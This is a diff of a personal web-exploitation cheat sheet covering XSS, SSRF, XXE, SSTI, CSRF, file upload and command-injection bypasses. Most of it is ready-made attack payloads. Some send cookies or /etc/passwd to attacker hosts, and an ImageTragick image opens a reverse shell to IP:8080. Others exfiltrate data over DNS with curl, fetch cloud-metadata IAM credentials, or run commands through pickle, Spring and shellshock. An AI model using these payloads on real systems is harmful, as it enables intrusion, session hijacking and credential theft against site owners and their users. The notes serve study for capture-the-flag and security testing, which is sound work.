@@ -1,4 +1,4 @@
-WEB
+%WEB%
 
 # Bioler Plate
 
@@ -21,7 +21,7 @@ WEB
 	Content-Type: application/json
 	Content-Type: application/x-shockwave-flash
 	Content-Type: application/js
-	Content-Type: text/xml
+	Content-Type: application/xml
 	Content-Type: application/x-www-form-urlencoded
 ```
 
@@ -144,7 +144,7 @@ Access-Control-Allow-Origin: *
 
 * [CORS DETAILED](./docx/corsAttack.pdf)
 
-## X-Forwarded-For
+## X-Forwarded-For | X-Real-IP
 
 ### what is?
 More like IP-Addr Spoofing. <br/>
@@ -158,6 +158,8 @@ Can be used to access blocked Pages which are only allowed by internal/specific 
 GET / HTTP/1.1
 Origin: 192.121.22.45
 X-Forwarded-For: 192.121.22.2
+or
+X-Real-IP : 127.0.0.1
 ```
 
 ### Exploiting
@@ -350,17 +352,26 @@ suppose the above query didnt worked and we can only query username
 ### Method 2
 
 ```
-https://app.zety.com/graphql?query={__schema%20{%0atypes%20{%0aname%0akind%0adescription%0afields%20{%0aname%0a}%0a}%0a}%0a}
-
+/graphql?query={__schema%20{%0atypes%20{%0aname%0akind%0adescription%0afields%20{%0aname%0a}%0a}%0a}%0a}
 ```
 
-this might dump schema of every table with columns
+this might dump schema of every table with columns..
 
+look for definations of table/connections:
+```
+This is how a single table defination is to search for
 
-now simply query .
+{
+	"kind": "OBJECT",
+	"name": "",
+	"description": null,
+	"fiels" : [
+		this is where we fields what we can query
+	]
+}
+
 ```
-https://app.zety.com/graphql?query={table {column1,column2} }
-```
+and make way as mentioned in video
 
 ## Smart Attack Vectors
 
@@ -387,13 +398,13 @@ Whenever you see a user input is rendered anywhere in the code , That can be pot
 ex:
 ```
 Payloads like <svg/onload=alert`1`> in every input field
-Adding `#` onto request, like site.com/#<svg>
+Requesting like site.com/#<svg>
 ```
 
 ## Exploiting
 
 ```
-<svg onload=fetch(‘//HOST/?cookie=’+document.cookie)>
+<svg onload=fetch('//HOST/?cookie='+document.cookie)>
 <svg onload=”document.body.innerHTML='<img src=//HOST/IMAGE>'”>
 <iframe src=//HOST/ style=display:none></iframe>
 <script src=//HOST/SCRIPT></script>
@@ -425,7 +436,7 @@ if(t.thisCannotExist){
 ### Hard filters
 
 
-** Injecting is inside Javascript, so out data is reflected in JS .**
+**Injecting is inside Javascript, so out data is reflected in JS .**
 
 `/ put the content to next line `
 
@@ -440,38 +451,21 @@ WAF blocking **Spaces**,**onload=alert()**
 > `<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>`
 > `<img/src='1'/onerror/=console.log`1`/>`
 
+### Local file read 
 
-### Addslashed inside script tag
-
-```
-<?php
-// Can you spot the xss ?
- 
-$username = isset($_GET["username"]) ? $_GET["username"] : "guest";
-$username = addslashes($username);
-?>
-<body>
-<script>
- const username = '<?=$username?>';
- document.body.innerText = `Hello ${username} !`;
-</script>
-```
-
-HTML parser is not JS aware, so it will close the script tag at first occurence of `</scipt>` even if its a string<br />
-So something like
+**We can have local file read from xxs as :**
 
 ```
-<script>
-const x = "</script>"; <!-- script closed here even if string -->
-</script>
+<object data="file://C:/windows/win.ini">
+<iframe src="file:///C:/windows/win.ini">
+<embed  data="file://C:/windows/win.ini">
+<img src="file:///C:\Program Files\Internet Explorer\images\bing.ico" />
 
 ```
 
-So to exploit this, we just need to close script tag<br />
 
-```
-/?username=</script><img onerror=alert`1` />
-```
+### Look into XSS.md
+
 
 
 # SSRF and URL Bypasses
@@ -495,7 +489,7 @@ A valid URL accroding to RFC :
 
 ## Impact
 
-Larger the serives on intranet severe the attack
+> Larger the serives on intranet, severe the attack.
 
 * Access pages that are accessible only on intranet/locally
 * Do a port scan
@@ -504,6 +498,10 @@ Larger the serives on intranet severe the attack
 * Bypass firewall/waf to sqli
 * Compromising Intranet 
 	* struts, elactic stack, jira , FTP, SMTP , redis, memcache etc
+* Getting Cloud Meta-data:
+	* AWS : http://169.254.169.254/latest/meta-data/hostname , http://169.254.169.254/latest/user-data , http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role
+
+	* Google cloud : "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"
 
 ## How To find?
 
@@ -511,11 +509,16 @@ Our goal is to find if a server made a request to us or not. Ex `example.com/?u=
 
 > Sites like https://beeceptor.com/ are used to log request made to it. so if site.com makes a request to url https://beeceptor.com/ going to console provided by https://beeceptor.com/ will show request.
 
+> Look into following :
+* webhooks
+* dynamic pdf generator
+* request to fetch image/asset url
+
 
 
 ## Exploiting
 
-For exploiting we maily target scheme,authority and path in URL
+For exploiting we maily target scheme/authority/path in URL
 ![alt](./images/attackURL.png)
 
 > Some Bypasses:
@@ -538,7 +541,7 @@ http://foo@evil.com:80 @google.com/
 will make request to evil.com and many languages use curl to make requets
 ```
 SO 
-* php    > parseURL
+* php    > parse_url
 * nodeJS > url 
 * Perl   > uri
 * go     > net/url
@@ -577,6 +580,7 @@ http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit
 
 ### IP Bypasses
 
+#### 1
 **So lets see ways to bypass checks to include IP address .**
 
 ```
@@ -597,6 +601,20 @@ if (userInput && userInput.value.indexOf('.') == -1 && userInput.value.indexOf("
 
 * **Cannot have `.`(dot) -_-. `1869573999` is decimal representation of IP address . Ip address can be represented as hex,decimal,oct binary. so in decimal looks like `http://3512041827/` octal looks like `http://0100.0351.0251.0152/` , `http://00C0.00A8.002B.005C` etc .**
 
+#### 2
+
+using IPv6:
+```
+https://[0:0:0:0:0:ffff:127.0.0.1]
+https://[::ffff:127.0.0.1]/
+https://[0:0:0:0:0:ffff:127.0.0.2]
+https://[::ffff:7f00:1]
+http://[::ffff:169.254.169.254]
+http://[0:0:0:0:0:ffff:169.254.169.254]
+'http://[::ffff:a9fe:a9fe]
+
+```
+
 ### Time of check time of use
 
 ```
@@ -610,11 +628,73 @@ reques(url)               <= url entry now points to 127.0.0.1 , thus at time of
 ```
 
 
-### Change scheme
-Use 302 redirection to change scheme from http/https to any other scheme like file, gopher etc
+### 302 redirect
+Use 302 redirection to change scheme from http/https to any other scheme like file, gopher etc. or bypass restricted IP's
+
+```
+url = "site.com/index.php"
+
+r = checkIfNotLocalhost(url); // proper check, not bypassable
+if( r ){
+	// so url is not localhost, make request now.
+	response = request("get", url);
+	res.send(response);
+}else{
+	// cannot have localhost
+}
+```
+
+> so we can use 302 redirects, to redirect SERVER => site.com/index.php[302 redirect to localhost] => SERVER(localhost)
+
+*site.com/index.php source code*
+```
+
+header("location: http://[::]:PORT/");
+
+```
+
+so when server visit index.php, its redirected to itself, just SSRF.
+
+### CURL + PHP 
+
+url = file://127.0.0.1@www.google.com:443/flag%23
+
+so for php
+```
+php > print_r(parse_url("file://127.0.0.1@www.google.com:443/flag%23"));
+Array
+(
+    [scheme] => file
+    [host] => www.google.com
+    [port] => 443
+    [user] => 127.0.0.1
+    [path] => /flag%23
+)
+```
+> and for curl: it will make request to file://127.0.0.1/flag# , meaning /flag and `not` document_root/flag
+
+### Using comments & Path normalization
+
+```
+
+$url = $_GET['url'];
+
+$parsed_url = parse_url($url);
+
+if( $parsed_url["host"] === "www.google.com" && $parsed_url["port"] === 443 ){
+	$url = $url + "/?q=hello";
+	echo curl.get($url);
+}
+```
+
+> sol1. : file://127.0.0.1@www.google.com:443/etc/hosts#
+> sol2. : file://www.google.com:443/../../../../../../../etc/hosts#
+
+here sol2 shows how we can normalize path to /etc/hosts and use `#` to bypass `$url + "/?q=hello";`
+
+
 
 # Protocol smuggling(CR-LF)
-
 
 ## what is?
 ## Reason
@@ -623,6 +703,7 @@ Use 302 redirection to change scheme from http/https to any other scheme like fi
 ## Exploiting
 ## Smart Attack vectors 
 
+### NODE CRLF
 Node JS bypass in http library due to stripping \xff from unicode strings<br/>
 suppose in node
 ```
@@ -639,18 +720,41 @@ and if `ff` is stripped from `U+FF0D` we get `0D` and tht is `\r` <br />
 
 **so userInput : `site.com/－＊ SLAVEOF@orange.tw@6379` and http will strip `ff` and we get `\r\n` and thus protocol smuggle**
 
+### Injections
+
+```
+http://127.0.0.1:333/lang=en%0a%0d, <= usually lang is reflected in cookie so TIP
+http://127.0.0.1:333/pa\rth,
+http://127.0.0.1:333/pa\nth,
+http://127.0a.0.1:333/pa\r\nth,
+http://127.0.0.1:333/path?param=foo\r\nbar,
+http://127.0.0.1:333/path?param=foo\rbar,
+http://127.0.0.1:333/path?param=foo\nbar,
+http://127.0.0.1:333/pa%0dth,
+http://127.0.0.1:333/pa%0ath,
+http://127.0a.0.1:333/pa%0d%0th,
+http://127.0.0.1:333/pa%0D%0Ath,
+http://127.0.0.1:333/path?param=foo%0Abar,
+http://127.0.0.1:333/path?param=foo%0Dbar,
+http://127.0.0.1:333/path?param=foo%0D%0Aba"
+```
+
+
 # SSTI
 
+## What Is?
 
-## RUBY
+
+## Proagramming Language based atacks vectors
+
+**check payloads in payloadandallthing**
+
+### RUBY
 
 * <%= 7 * 7 %>
 * <%= File.open('/etc/passwd').read %>
 
-
-**check payloads in payloadandallthing**
-
-## Angular
+### Angular
 	
 * `{{5*5}}`
 * `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}` for Versions 1.3.0-1.5.7
@@ -658,6 +762,13 @@ and if `ff` is stripped from `U+FF0D` we get `0D` and tht is `\r` <br />
 * `{{c=toString.constructor;p=c.prototype;p.toString=p.call;["a","alert(1)"].sort(c)}}` for 1.2.19
 * `{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}` for 1.2.6 - 1.2.18
 * `{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}` for 1.2.0 - 1.2.5
+
+### Python
+
+Look into  file:
+* "/Users/Aman/Desktop/ctf/____reminder____/web\ expoliting/python/Jinja2\ template\ injection.pdf"
+* "/Users/Aman/Desktop/ctf/____reminder____/web\ expoliting/python/ssti \python"
+
 
 # Fuzzing
 
@@ -672,8 +783,9 @@ and if `ff` is stripped from `U+FF0D` we get `0D` and tht is `\r` <br />
 
 # Race Condition
 
-**Finding Race Condition is basically just see if some API is taking too long to response, could be due to computation, saving to cache, retrieving db etc .**
-[writeup in web/race Condition]
+If you can manipulate : TIme of CHECK, TIme OF use.
+Example : `/Users/Aman/Desktop/ctf/____reminder____/web\ expoliting/raceCondition\ Basic.htm`
+
 
 # Rate Limiting
 
@@ -854,37 +966,7 @@ In this bug we are able to read abt file from the server
 ## Impact
 ## How to find
 ## Exploiting
-
-
-
-
 ## Smart Attack vectors 
-
-
-
-
-# Python general files to bruteforce 
-
-> get /proc/self/cmdline can leak the location where the python app is loaded 
-
-```
->  url=file:///proc/self/cmdline
-
-<  uwsgi --socket 0.0.0.0:8000 --module rwctf.wsgi --chdir /usr/src/rwctf --uid nobody --gid nogroup --cheaper-algo spare --cheaper 2
-```
-
-so working directories are : /usr/src/rwctf
-
-actual places where to look for below mentioned files are `/usr/src/rwctf/rwctf/settings.py` , `/usr/src/rwctf/admin/settings.py` etc
-
-* `__init__.py`
-* `urls.py`
-* `settings.py`
-* `apps.py`
-* `views.py`
-
-
-
 
 # IDOR
 # DATA Leak
@@ -926,11 +1008,30 @@ send a.html to normal user and this will end up changing normal user name
 
 ## Smart attack vectors
 
-### Flashbased CSRF with SOP bypass(crossdomain.xml bug)
+* [Detailed attack](./docx/csrf.pdf)
 
-Caused due to misconfigured crossdomain.xml
+### Unvalidated content-type JSON CSRF
 
-if in `crossdomain.xml` allowsites is * , we can perform this attack
+* if Server looking for json formatted data but don’t validate the Content-type. <br/>
+
+> Use Fetch request, as we know in this case server is only checking for the post data if it’s correctly formatted or not, if yes it will accept the request regardless the Content-type is set as text/plain.
+
+```
+<center>
+<h1> JSON CSRF POC </h1>
+<script>
+fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"name":"attacker","email":"attacker.com"}'});
+</script>
+<form action="#">
+<input type="button" value="Submit" />
+</form>
+</center>
+```
+
+
+### JSON CSRF data validating content-type
+
+**Caused due to misconfigured crossdomain.xml. If in crossdomain.xml allowsites is * , we can perform this attack**
 
 why crossdomain.xml? <br/>
 When we want data from xxx.com to evil.com with flash, Flash first check that Xxx.com has crossdomain.xml or not. If there It checks its details Like does it accept evil.com request or not
@@ -938,9 +1039,9 @@ When we want data from xxx.com to evil.com with flash, Flash first check that Xx
 Attack
 ```
 We create 3 things in our server
-php page 
-flash file
-Crossdomain.xml in root dir
+php page with 307/302 redirect
+Crafted flash file
+Crossdomain.xml in root dir of ur site
 ``` 
 * we create a crossdomain.xml in our evil.com with wildcards `allowsites:*`
 * Now lets make flash file
@@ -988,11 +1089,311 @@ remove the token entriely from the request
 If token is MD5,or base64 or something, just decode it and see.
 
 
+# Python 
+
+## general files to bruteforce 
+
+> get /proc/self/cmdline can leak the location where the python app is loaded 
+
+```
+>  url=file:///proc/self/cmdline
+
+<  uwsgi --socket 0.0.0.0:8000 --module rwctf.wsgi --chdir /usr/src/rwctf --uid nobody --gid nogroup --cheaper-algo spare --cheaper 2
+```
+
+so working directories are : /usr/src/rwctf
+
+actual places where to look for below mentioned files are `/usr/src/rwctf/rwctf/settings.py` , `/usr/src/rwctf/admin/settings.py` etc
+
+* `__init__.py`
+* `urls.py`
+* `settings.py`
+* `apps.py`
+* `views.py`
+
+
+## Deserialization
+
+>Suppose the task is simply read `flag.txt`
+
+```
+x = cPickle.dumps(raw_input())
+try:
+	out = cPickle.loads(base64.b64decode(x))
+except:
+	pass
+
+response.send(out)
+```
+
+**So it takes out input and does dumps on it so we dont have to do it**
+
+>solution
+
+```
+class PickleRce(object):
+    def __reduce__(self):
+        import subprocess
+        return (subprocess.getoutput,('cat flag.txt',))
+
+out = PickleRce()
+
+```
+
+## python flask url checks bypass
+
+```
+from  werkzeug.urls import url_parse
+
+@app.route('/xyz'):
+	
+	postdata = app.request.post("url")
+	scheme, netloc, path, query, fragment = url_parse(postdata)
+	if path.startsWith("/cannotViewThisPage"):
+		return None
+	else:
+		request.get(postdata,allow_redirects=False) # if this is true , just redirect and get
+
+@app.route('/cannotViewThisPage'):
+	if request.remote_addr != "127.0.0.1":
+			// if request not comming locally, fuck him
+			return "Fuck off"
+	else:
+		print "you win"
+```
+
+> ok so task is simple, we need "you win"
+payload
+```
+POST site.com/xyz
+
+url=http://localhost///cannotViewThisPage
+```
+
+so `url_parse` will return path of `http://localhost///cannotViewThisPage` as "///cannotViewThisPage"
+which indeed dont start with "/cannotViewThisPage" and when request module makes reques, python django will hit /cannotViewThisPage
+
+
+## Weird python url handing
+
+```
+from flask import Flask     
+app = Flask(__name__)       
+
+@app.route("/test")         
+def test():                 
+    return "Hello test!"    
+
+if __name__ == "__main__":  
+    app.run()               
+```
+
+> curl localhost:5000/test  <== 200 OK 
+> curl localhost:5000//<wht>/test  <== 200 OK....  DOnt know why
+
+## Python "a""b" is "a"+"b"
+
+**Well  if in python + is blocked , we can just use this trick to append strings .**
+
+## Python3 f''
+
+https://github.com/p4-team/ctf/tree/master/2018-07-13-meepwn-ctf/web_pycalcx#pycalcx2-54-solved-100p
+
+```
+FLAG = "hello"
+source = raw_input()
+
+f'Tru{FLAG<source or 14:x}'  
+
+```
+* We use the short circuit `or` to get one of the two results, depending on the result of comparison `FLAG < source`, i.e , `True or 14` returns True and False or 14 returns 14.
+* We use x modifier to turn 14 into hex digit e
+* `Tru{FLAG<source or 14:x}` therefore evaluates to either `Tru1` or `True`, depending on the FLAG>source condition
 
 
 # XML injection
 
-# XXE
+# XXE(XML external entity injection)
+
+## what is?
+
+So when XML from attacker is parsed on web server without validations, it can allow attacker to inject and run xml code which can lead to file read, ssrf etc.
+
+Normal XML
+```
+<?xml version="1.0">
+<Root>
+	<Value>1234</Value>
+</Root>
+```
+
+XML with Entity declared inside a DTD
+```
+<?xml version="1.0">
+<!DOCTYPE Root [
+	<!ENTITY name "value">
+]>
+<Root>
+	<Name>&name;</Name>
+</Root>
+```
+
+
+### DTD(Document type defination)
+
+There are 2 types of DTD:
+* Inline DTD
+* External DTD as shown below
+
+DTD is declared Above our XML data and below `<?XML >` inside a `DOCTYPE`.Example
+```
+=====Internal DTD=====
+
+<?xml version="1.0">
+<!DOCTYPE Root [<!ENTITY name "file.txt">] > 
+
+
+=====external dtd=====
+
+<?xml version="1.0">
+<!DOCTYPE Root SYSTEM "external.dtd" > 
+```
+
+### Entity inside Entity
+```
+<?xml version="1.0">
+<!DOCTYPE Pwn [
+	<!Entity % param_entity "<!Entity name 'aman'>">
+	%param_entity;
+]> 
+<Pwn>
+	<p>&name;</p>
+</Pwn>
+```
+So % is a way to declare entity inside entity
+
+## Reason
+
+Taking XML from user and directly parsing it. We can create local/external entity(basically variable) inside a DTD. Example of such DTD would be
+
+External Entity Injection
+```
+<!DOCTYPE Root [
+	<!ENTITY name "file.txt">
+	<!ENTITY name1 SYSTEM "/etc/passwd">
+	<!ENTITY name2 SYSTEM "file:///etc/passwd">  // ANY FALID URI works like file, gopher, http, ftp, etc
+]>
+
+```
+
+## Impact
+
+So this can be used to:
+* make a server side request using <ENTITY % ext SYSTEM "http://server.com" > declared inside DTD
+
+## How to find
+
+So there are basically 3 types of it:
+* Inband ( XML is parsed and output is directly output on the response)
+* Error Based ()
+* OOB -out of band/Blind XXE (No ouput)
+
+## Exploiting
+
+**video in vids/xxe.mp4 for Inband and OOB exploitation.**
+
+### Inband
+we have direct output here
+```
+<?xml  version="1.0">
+<!DOCTYPE Root [
+	<!ENTITY name "file.txt">
+	<!ENTITY name1 SYSTEM "/etc/passwd">
+	<!ENTITY name2 SYSTEM "file:///etc/passwd">  // ANY FALID URI works like file, gopher, http, ftp, etc
+]>
+<Root>
+	<v1>name</v1>
+	<v2>name1</v2>
+	<v3>name2</v3>
+</Root>
+```
+
+### Error Based
+
+Suppose we have the following payload
+```
+<?xml version="1.0" ?>
+<!DOCTYPE message [
+	<!ENTITY id SYSTEM "file:///etc/passwd"
+]>
+<message>&id;</message>
+```
+__And it errors out saying "error cannot parse or markup error". Basically we are able to read file but cannot get contents because it breaks the XMLParser.__
+
+look onto vids/error_xxe.mp4 for how to get error xxe.
+
+
+
+### OOB
+
+We will have to make request to our server to get output(XXE TO SSRF )
+```
+<?xml  version="1.0">
+<!DOCTYPE Root [
+	<!ENTITY name SYSTEM "http://IP">
+]>
+<Root>
+	<v>&name;</v>
+</Root>
+```
+
+
+
+**So Here is reading a file from client server and sending its content to our server(We should be able to load external DTD for this ). Here we need ExternalEntity.dtd hosted on our server if not uploaded on clientserver. Explaination in the video.**
+
+> Contents of http://IP/ExternalEntity.dtd
+```
+<!ENTITY % passwd "/etc/passwd">
+<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://IP.com/?%passwd;'> ">
+%wrap;
+```
+
+> mainExploit.xml
+```
+<?xml  version="1.0">
+<!DOCTYPE data SYSTEM "http://IP/ExternalEntity.dtd">
+<data>&send</data>
+```
+
+
+
+## Smart Attack vectors
+
+### CDATA To avoid bad characters 
+Suppose a file.txt contents are as :
+```
+<pass>password
+```
+
+so pyload below wont work because XML try to parse the file loaded and will error out
+```
+<!ENTITY name SYSTEM "file.txt">
+```
+
+So to avoid this we use CDATA which tell xml not to parse whtevers inside it, something like
+```
+<![CDATA[ TEXT here ]]>
+```
+
+So we can do something like
+```
+<!ENTITY % file SYSTEM "file:///var/html/flag.txt">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]">
+<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;' ">
+%wrapper;
+```
+
 
 
 # Parameter polluting
@@ -1078,23 +1479,76 @@ data=<?=$_=~%9c%9e%8b;`$_ ../*>_`;%26name%3Dz.php%00
 so the payload will cat everthing in ../, then write to _ .
 
 
-# File Uploading
+# File Uploads
 
+## what is?
+
+Uploading malicious file onto server 
+
+## Reason
+
+* Improper valitation of checking file extension
+* using old version converter plugin(imagetragic) to transform/resize file.
+
+## Impact
+
+* If we can run server side code, we get full rce
+* stored xss
+* CSRF via svg upload
+
+
+## How to find
+
+* a.'svg
+* a."gif
+* ``` a.`gif ```
+* a.\.gif
+* a.png.svg
+* file.php.png [yes]
+* file.png.php [no]
+* file.php;png [yes]
+* file.php%00.png [yes]
+* file.php.php.png [yes]
+* file.png.php.php [no]
+* file.php.png123 [yes]
+* file.png%00file.php [no]
+* file.png' or 1=1# [no]
+* file [yes]
 * Try `shell.php` , `shell.pHp5` , `shell.php4`,`shell.php4;`,`shell.php4%00` ,`shell.phtml`,`shell.pht` , `shell.pgif` , `shell.phpt`,`shell.shtml`
 * filename `<svg/onload=prompt(1)>.png`
 * see if flash file can be uploaded
 * change Content-Type , upload `shell.png` with php content and intercept request and change content-type from `png` to `php5`
-* ~~ImageTragic~~ `have to read this`
 * shell in gif/png files if there is file include
 
-* Fuzzing for bad extensions available:
-	* a.'gif
-	* a."gif
-	* ``` a.`gif ```
-	* a.\.gif
+## Exploiting
 
-* IE content sniffing
-	* In IE, and unknown extension like `a.''gif` with content `GIF8;<Script>alert(1);` will be trated as text/HTML .
+## Smart Attack vectors
+
+### ImageTragic
+
+Save it as test.jpg and upload it as an image:
+```
+%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/IP/8080 0>&1') currentdevice putdeviceprops
+```
+
+Another simple payload exploit.png. [ USING DNS query to exfilterate data due to firewall not allowing HTTp]
+```
+push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60for i in $(ls /) ; do curl "http://$i.attacker.tld/" -d @- > /dev/null; done`'
+pop graphic-context
+```
+
+**Look into docx/imagetragic.pdf** for more more detail.
+
+### IE content sniffing
+
+* In IE, and unknown extension like `a.''gif` with content `GIF8;<Script>alert(1);` will be trated as text/HTML .
 
 
 # LDAP
@@ -1113,6 +1567,28 @@ will inject uid
 
 # Command Injection
 
+## what is?
+
+Injecting Shell command 
+
+## Reason
+
+* Bad valitation/filtering of commands
+
+## Impact
+
+RCE
+
+## How to find
+
+* Reading Code
+* Fuzzing 
+
+## Exploiting
+
+## Smart Attack vectors
+
+### blackListing [";","&","|"," ","cat"];
 ```
 blackList = [";","&","|"," ","cat"];
 userInput = req.get("cmd");
@@ -1121,23 +1597,22 @@ if blacklist.includes(userInput):
 else:
 	system("ping -c 4 ".userInput)[:86]; // so even if someone append something, ping's result is whats 									 // output only
 ```
-> exploits : 
+#### exploits :
 * `index.php/?cmd=error%0ac'a't$IFS/etc/flag`
 * `index.php/?cmd=$(cat</etc/passed>/tmp/out)`
 * `index.php/?cmd=error%0ac'a't$IFS/etc/flag`
+
 > So there is a simple blacklist. so lets see how to solve it 
 
-* Use burp intruder we can find these blacklist 
+* Step 1, find the blacklisted characters through fuzzing 
 * Now we need to append our command but `&`,`;` and `|` are blocked, so lets see whats are its bypasses
 	* `%0a`, `%0A` 
 	* `^`
 	* `$(cat</etc/passed>/tmp/out)`
-	* ```
-	`ls`
-	```
+	* ``` `ls` ```
 	* `%0d`, `%0D`
 * Next we need can simply make 'error' in 1st query by `ping error`%0a[nextCommand]
-* Now next command cannot have space, so we have many things to avaoid having space
+* Now next command cannot have space, so here's tricks to avoid spaces
 	* `%0a{cat,/etc/flag}` , the {ls,-l,a,Gh} is a shell feature equivalent to `ls -l a Gh`
 	* `%0acat$IFS/etc/flag` , the `$IFS` is shell variable equivalent to space
 	* `%0acat${IFS:0:1}/etc/flag`, setting this IFS variable length
@@ -1188,39 +1663,288 @@ else:
 curl -H “user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://site.com/cgi-bin/stats
 ```
 
+# REGEX bypassing
 
-# Deserialization
+**Approch**
 
+* use burp intruder to find all the blocked characters ,ex / `site.com/?id=%$$` in intruder and intefer from `1` to `ff`, will make 255 requsest from %00 to %FF finding blocked characters
+* now imagine we get blocked `%20` = `space`, `%3b` = `;` , `%26` = `&`, so now make a list of allowed yet dangerous chars,
+* so we can send `%00`, `%0a` , `{`,`}`,``` ` ```, `$`,`<`,`>`,`/`,`\`,`,`,`"`,`'` etc
+* Now just find the appropriate bypass
 
-## Python
-
-
->Suppose the task is simply read `flag.txt`
-
-```
-x = cPickle.dumps(raw_input())
-try:
-	out = cPickle.loads(base64.b64decode(x))
-except:
-	pass
-
-response.send(out)
-```
-
-**So it takes out input and does dumps on it so we dont have to do it**
-
->solution
 
 ```
-class PickleRce(object):
-    def __reduce__(self):
-        import subprocess
-        return (subprocess.getoutput,('cat flag.txt',))
+$cmd = $_GET['c_m_d'];
+if(!preg_match('/[a-z0-9]/is', $cmd)){
+	system("/sandboxed_bin/".$cmd);
+}
+```
+* Find supported UTF encoding, cuz `a` === `à`, finding unicode can help here.
+* `GET  : /?c_m_d[]='ls'` will make cmd as array and bypass check in PHP
+* `POST : { c_m_d : ['ls']` with `Content-Type: application/json` in any.
+* `GET  : /?c_m_d=???+????.???` will be cat flag.txt and bypass regex
 
-out = PickleRce()
+**some command bypasses**
+
+* Try mixing upper+lower case `HtTp` 
+* `regex : a.*b` can be bypassed `a%0Ab`
 
 ```
+$black_list = "/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|";
+$black_list .= "=|_| |in|<|>|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i";
+if(preg_match($black_list, $_GET['user'])) exit();
+if(preg_match($black_list, $_GET['pw'])) exit(); 
 
+$query="select user from chal where user='$_GET[user]' and pw='$_GET[pw]'"; 
+
+```
+* using `\` to bypass next letter. so  `'` is block ,use `\`,i.e `/?user=\&pw=||user/**/REGEXP/**/%22admi%22||%22n%22;%00` ,making this request <br/>
+we get `where user='\' and pw='||user REGEXP "admi||n" '` where regexp is mysql feature
+
+
+# URL's
+
+## `..\Q/\E` in Ruby equals `../`
+
+## Nginx off by slash
+
+**Python's Djano, ruby etc donot have inbuilt static files folder, so ppl put nginx infront of these apps for <br/>
+delivering static file .**
+
+**In `nginx` we can define a alias for a location .eg**
+```
+location /static {
+	alias /home/pi/;
+}
+```
+exploit : `127.0.0.1/static../`, so `/static` in route matches `location /static` <br/>
+causing to make path=`/home/pi/../` giving us access to 1 directory above
+
+>so how to find this
+* http://target.com/asset/app.js  [200 OK]
+* http://target.com/asset/		  [403] 
+* http://target.com/asset/../setting.py [404]
+* http://target.com/asset../ 			[403]
+* http://target.com/asset../assets/app.js [200] :O wow but yeah, we might get `alias.com/alias/../assets/app.js`
+* http://target.com/asset../setting.py    [200] is file is in above directory else 404?
+
+## javacript:alert
+
+if we can insert links
+```
+javascript:document.location="http://mysite.com/"+document.cookie
+```
+
+
+
+
+# JSP/JAVA
+
+
+## Template Injecting(SPRING framework)
+
+```
+site.com/?q={7*7}
+
+site.com/?q=${T(java.lang.System).getenv()}
+
+site.com/?q=${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+OR
+site.com/?q=${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())
+```
+
+
+# PHP
+
+
+## PHP-info.php
+
+> What to look for if we get phpinfo.php
+
+* allow-url-encode : true/false
+	* tells if php `include` can include remote file via `http` wrapper
+* session-save-path : /var/lib/php/session
+	* location of saved cookie
+* disable_functions
+	* tell functions that dont work
+	* some function we should look for:
+		* system
+		* exec
+		* shell_exec
+		* popen
+		* proc_open
+		* passthru
+		* symlink
+		* link
+		* syslog
+		* imap_open
+		* ld
+		* mail
+		* putenv
+
+
+## PHP bypass
+
+### `cannot have " or '`
+
+```
+> echo pack(C3,112,104,112);
+< "php"
+```
+
+`$_GET['q'] is preg_match and we cannot have "flag.php" in it`
+
+> Bypass 1
+
+```
+> site.com/?q=get_defined_vars()[_GET][X]&X=flag.php
+```
+
+### cannot use character 
+
+```
+$a = $_GET['a'];
+if(preg_match('/^[a-zA-Z0-9]$/'),$a){
+  echo "sorry";
+}else{
+  eval($a);
+}
+```
+
+> bypass
+
+```
+site.com/?a=~%8C%86%8C%8B%9A%92(~%9C%9E%8B%DF%D5)
+```
+
+* `~` will negate %8C%86%8C%8B%9A%92 tht will produce string "system" , similarly %9C%9E%8B%DF%D5 is `cat *`
+* in PHP "system"("ls") is system("ls") and we get answer
+
+### Bypass 2 ** AWESOME PHP Fool **
+
+In php , if we send `site.com/?q=substr(asdf,0,10)`, so unlike most language showing asdf is not defined php will auto convert asdf to "asdf" string and pass into substr
+
+```
+> site.com/?q=str_rot13(substr(cjq))
+```
+so no need of `;'",$_` .
+
+## PHP cannot have `_`
+
+**PHP functionality  converts `.` and spaces into `_`, so `site.com/?c.m.d=23` gets converted to "$c_m_d=23" .**
+
+##spaces are not allowed
+
+**Use `+` in query string to bypass space .**
+
+## PHP file_get_content 
+
+**This is super dangerous**
+
+```
+$f = $_GET['content'];
+file_get_contents($f);
+```
+
+Possible values of `$f` are:
+* file_get_contents('https://www.evil.com/mydata'); so `$f = https://www.evil.com/mydata`
+* `php://input` and "mydata" in POST `so $f=php://input`
+* All php wrapper , `php://filter`, `php://fd/0` etc
+* `$f = data://text/plain,Hello Challenge! `
